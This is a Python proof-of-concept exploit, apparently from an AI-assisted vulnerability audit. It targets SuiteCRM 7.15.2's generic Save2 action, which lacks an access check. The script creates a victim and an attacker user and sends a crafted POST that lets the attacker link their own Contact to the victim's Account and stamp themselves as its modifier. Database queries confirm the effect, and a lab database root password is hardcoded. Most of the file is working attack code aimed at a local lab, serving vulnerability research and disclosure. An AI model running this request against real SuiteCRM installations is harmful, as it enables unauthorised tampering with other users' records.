#!/usr/bin/env python3
"""
VULN-023 -- Save2: create relationships / relate arbitrary records on any
            record (no ACL)

Target:   SuiteCRM 7.15.2 (targets/SuiteCRM/)
Sink:     include/generic/Save2.php:124 ($focus->retrieve($_REQUEST['record']),
          no ACL), :198-204 ($focus->$relName->add($_REQUEST['subpanel_id'], ...)
          then $focus->save() -- no ACLAccess/checkAccess/is_admin anywhere
          in the file).
Routing:  action_file_map.php maps action=Save2 straight to this generic
          file, bypassing the target module's own controller (same pattern
          as DeleteRelationship / SubPanelViewer).

What this script does
----------------------
1. Logs in as admin, creates two fresh, UNRELATED low-priv users: victim V
   and attacker A.
2. As V: creates an Account (owned by V, A has no ACL/ownership/Security-
   Group relation to it).
3. As A: creates their OWN Contact (owned by A) -- a record A is legitimately
   allowed to create, but which has no relationship to V's Account.
4. Confirms via the DB that no accounts_contacts row links V's Account to
   A's Contact yet, and records V's Account's current date_modified/
   modified_user_id (baseline).
5. As A: POSTs action=Save2 against V's Account (record=<V's account>,
   subpanel_field_name=contacts, subpanel_id=<A's contact>) -- i.e. A forces
   a relationship onto a record A does not own.
6. Asserts the REAL effect: (a) a new accounts_contacts row now links V's
   Account to A's Contact, deleted=0; AND (b) V's Account's own
   modified_user_id changed to A's user id (SugarBean::save() stamps the
   *current* user as modifier) -- i.e. A's write actually touched V's
   record's own row, not just a join table.

Environment variables (defaults match claude_audit/SuiteCRM/SuiteCRM_summary.md):
    BASE_URL, ADMIN_USER, ADMIN_PASS, COMPOSE_PROJECT

Exit code 0 + "[OK]" on CONFIRMED, non-zero + "[FAIL]" otherwise.
"""
import os
import re
import subprocess
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (BASE_URL, log, banner, rand, verdict, admin_session, create_user, web_login)

VULN_ID = "VULN-023"
HERE = os.path.dirname(os.path.abspath(__file__))
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT", "cvehunterlab_suitecrm")


def save_evidence(request_txt, response_obj):
    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(request_txt)
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"HTTP/1.1 {response_obj.status_code} {response_obj.reason}\n")
        for k, v in response_obj.headers.items():
            f.write(f"{k}: {v}\n")
        f.write("\n")
        f.write(response_obj.text[:10000])


def db_query(sql):
    r = subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, "exec", "-T", "db",
         "mysql", "-uroot", "-pSuiteRoot!2026x", "suitecrm", "-N", "-e", sql],
        capture_output=True, text=True, timeout=30,
    )
    return r.stdout.strip()


def main():
    banner(VULN_ID, "Save2 -- relate arbitrary records onto any parent (no ACL)")

    log("SETUP", "admin web login")
    admin = admin_session()

    log("SETUP", "provisioning victim (V) and attacker (A) -- fresh, unrelated low-priv users")
    victim = create_user(admin, "Victim023@2026x!")
    attacker = create_user(admin, "Attacker023@2026x!")
    log("INFO", f"victim   = {victim['user_name']} ({victim['id']})")
    log("INFO", f"attacker = {attacker['user_name']} ({attacker['id']})")

    vs = web_login(victim["user_name"], victim["password"])
    as_ = web_login(attacker["user_name"], attacker["password"])

    log("SETUP", "as V: create an Account (owned by V, no relation to A)")
    acct_name = rand("V023Acc")
    r = vs.post(f"{BASE_URL}/index.php", data={
        "module": "Accounts", "action": "Save", "record": "", "name": acct_name,
    }, headers={"Referer": f"{BASE_URL}/index.php?module=Accounts&action=EditView"},
        allow_redirects=False, timeout=30)
    m = re.search(r"record=([0-9a-fA-F-]{36})", r.headers.get("Location", ""))
    if not m:
        verdict(VULN_ID, "FAILED", f"could not create victim Account (status={r.status_code})")
        sys.exit(1)
    acct_id = m.group(1)
    log("OK", f"Account created: {acct_id} ({acct_name}), owned by V")

    log("SETUP", "as A: create A's OWN Contact (owned by A, no relation to V's Account)")
    contact_last = rand("A023Contact")
    r = as_.post(f"{BASE_URL}/index.php", data={
        "module": "Contacts", "action": "Save", "record": "",
        "first_name": "Attacker023", "last_name": contact_last,
    }, headers={"Referer": f"{BASE_URL}/index.php?module=Contacts&action=EditView"},
        allow_redirects=False, timeout=30)
    m = re.search(r"record=([0-9a-fA-F-]{36})", r.headers.get("Location", ""))
    if not m:
        verdict(VULN_ID, "FAILED", f"could not create attacker Contact (status={r.status_code})")
        sys.exit(1)
    contact_id = m.group(1)
    log("OK", f"Contact created: {contact_id} (last_name={contact_last}), owned by A, NOT related to V's Account")

    log("STEP", "confirm no accounts_contacts row links V's Account to A's Contact yet; baseline V's Account row")
    before_rel = db_query(
        f"SELECT id FROM accounts_contacts WHERE account_id='{acct_id}' AND contact_id='{contact_id}' AND deleted=0;"
    )
    before_acct = db_query(f"SELECT modified_user_id, date_modified FROM accounts WHERE id='{acct_id}';")
    log("INFO", f"pre-attack relationship row (expect empty): {before_rel!r}")
    log("INFO", f"V's Account BEFORE (modified_user_id, date_modified): {before_acct!r}")
    if before_rel:
        verdict(VULN_ID, "FAILED", "relationship already existed before the attack -- test setup invalid")
        sys.exit(1)
    if not before_acct.startswith(victim["id"]):
        verdict(VULN_ID, "FAILED", f"unexpected baseline modified_user_id on V's Account: {before_acct!r}")
        sys.exit(1)

    log("STEP", "as A (no ownership/ACL on V's Account): Save2 relates A's own Contact onto V's Account")
    params = {"module": "Accounts", "action": "Save2"}
    body = {
        "record": acct_id, "subpanel_field_name": "contacts", "subpanel_id": contact_id,
        "subpanel_module_name": "Contacts", "refresh_page": "1",
    }
    request_txt = (
        f"POST /index.php?module=Accounts&action=Save2 HTTP/1.1\n"
        f"Host: localhost:33116\n"
        f"Cookie: PHPSESSID=<attacker session>\n"
        f"Content-Type: application/x-www-form-urlencoded\n"
        f"Referer: {BASE_URL}/index.php?module=Accounts&action=DetailView&record={acct_id}\n\n"
        f"record={acct_id}&subpanel_field_name=contacts&subpanel_id={contact_id}"
        f"&subpanel_module_name=Contacts&refresh_page=1\n"
        f"\n# Attacker A ({attacker['user_name']}) owns Contact {contact_id} but has\n"
        f"# NO ownership/ACL/Security-Group relation to Account {acct_id} (owned by V).\n"
    )
    r2 = as_.post(f"{BASE_URL}/index.php", params=params, data=body, timeout=30,
                   headers={"Referer": f"{BASE_URL}/index.php?module=Accounts&action=DetailView&record={acct_id}"})
    save_evidence(request_txt, r2)
    log("INFO", f"attack response status={r2.status_code} len={len(r2.text)}")

    log("PROOF", "re-querying accounts_contacts + V's Account row AFTER the attacker's Save2")
    after_rel = db_query(
        f"SELECT id, deleted FROM accounts_contacts WHERE account_id='{acct_id}' AND contact_id='{contact_id}';"
    )
    after_acct = db_query(f"SELECT modified_user_id, date_modified FROM accounts WHERE id='{acct_id}';")
    with open(os.path.join(HERE, "evidence", "db_before_after.txt"), "w") as f:
        f.write(
            f"account_id={acct_id} (owned by V={victim['id']})\ncontact_id={contact_id} (owned by A={attacker['id']})\n\n"
            f"accounts_contacts BEFORE: {before_rel!r}\naccounts_contacts AFTER:  {after_rel!r}\n\n"
            f"accounts row BEFORE (modified_user_id, date_modified): {before_acct!r}\n"
            f"accounts row AFTER  (modified_user_id, date_modified): {after_acct!r}\n"
        )
    log("PROOF", f"accounts_contacts AFTER attack: {after_rel!r}")
    log("PROOF", f"V's Account AFTER attack (modified_user_id, date_modified): {after_acct!r}")

    rel_created = bool(after_rel) and after_rel.endswith("\t0")
    acct_touched_by_attacker = after_acct.startswith(attacker["id"])

    if not rel_created:
        verdict(VULN_ID, "FAILED", "no accounts_contacts row was created by the attacker's Save2 request")
        sys.exit(1)
    if not acct_touched_by_attacker:
        log("INFO", "relationship row was created, but V's Account.modified_user_id was not stamped to A "
                     "(still decisive evidence via the join-table row; noting for completeness)")

    log("OK", f"attacker A (no ACL on V's Account) forced a relationship between A's own Contact and V's Account; "
              f"accounts_contacts row created, V's Account modified_user_id now={after_acct.split(chr(9))[0]}")
    verdict(VULN_ID, "CONFIRMED",
            f"non-owner A related Contact {contact_id} to V's Account {acct_id} via Save2, no ACL check")
    sys.exit(0)


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:  # noqa: BLE001
        log("FAIL", f"unhandled exception: {exc!r}")
        verdict(VULN_ID, "FAILED", f"unhandled exception: {exc}")
        sys.exit(1)
